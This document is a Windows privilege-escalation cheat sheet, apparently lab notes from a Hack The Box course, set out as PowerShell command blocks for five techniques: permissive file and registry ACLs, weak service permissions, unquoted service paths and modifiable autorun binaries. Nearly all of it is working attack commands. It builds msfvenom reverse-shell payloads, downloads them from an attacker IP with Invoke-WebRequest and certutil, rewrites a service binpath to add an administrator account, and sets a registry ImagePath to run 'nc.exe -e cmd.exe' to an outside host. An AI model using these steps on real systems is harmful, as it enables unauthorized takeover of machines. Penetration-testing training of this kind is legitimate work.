# Permissive File System ACLs
```powershell
SharpUp.exe audit

icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
BUILTIN\Users:(I)(F)
Everyone:(I)(F)

# Creat Malicious System File
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > SecurityService.exe

# Listener
nc -lvnp 4444

# Backup Original File
cd "C:\Program Files (x86)\PCProtect"
move SecurityService.exe SecurityService.exe.bak

# Download Malicious File
Invoke-WebRequest -Uri "http://10.10.14.3:8080/SecurityService.exe" -OutFile "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# Service stop and restart
sc.exe stop SecurityService
sc.exe start SecurityService

# Cleanup
taskkill /F /IM SecurityService.exe
del SecurityService.exe
move SecurityService.exe.bak SecurityService.exe
sc start SecurityService
```

# Weak Permissions
```powershell
SharpUp.exe audit
=== SharpUp: Running Privilege Escalation Checks ===
=== Modifiable Services ===
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

# Check Permissions
accesschk.exe /accepteula -quvcw WindscribeService

# Changing the Service Binary Path
sc.exe config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Restart Service
sc.exe stop WindscribeService
sc.exe start WindscribeService

# Confirming Local Admin Group
net localgroup administrators
```

# Unquoted Service Path
```powershell
# Check Unquoted Service Path
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike '*C:\Windows\*'} | Select-Object Name, PathName

For Example:
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

# Querying Service
sc.exe qc SystemExplorerHelpService

# Create Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=6666 -f exe > SystemExplorerService64.exe

# Stop / Start Service
sc.exe stop SystemExplorerService64.exe
sc.exe start SystemExplorerService64.exe
```

# Permissive Registry ACLs
```powershell
accesschk.exe /accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\services
accesschk.exe /accepteula "<CURRENT_USERNAME>" -kvuqsw hklm\System\CurrentControlSet\services

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS or KEY_SET_VALUE ( Vulnerable )

# Check ImagePath
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath

# Set ImagePath
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

# Modifiable Registry Autorun Binary
```powershell
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"

# Create Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8888 -f exe > Windscribe.exe

# Rogue File
cd "C:\Program Files (x86)\Windscribe"
move Windscribe.exe Windscribe.exe.bak
certutil -urlcache -f http://10.10.14.3:8080/Windscribe.exe Windscribe.exe

WAIT FOR ADMIN SHELL!!!
```
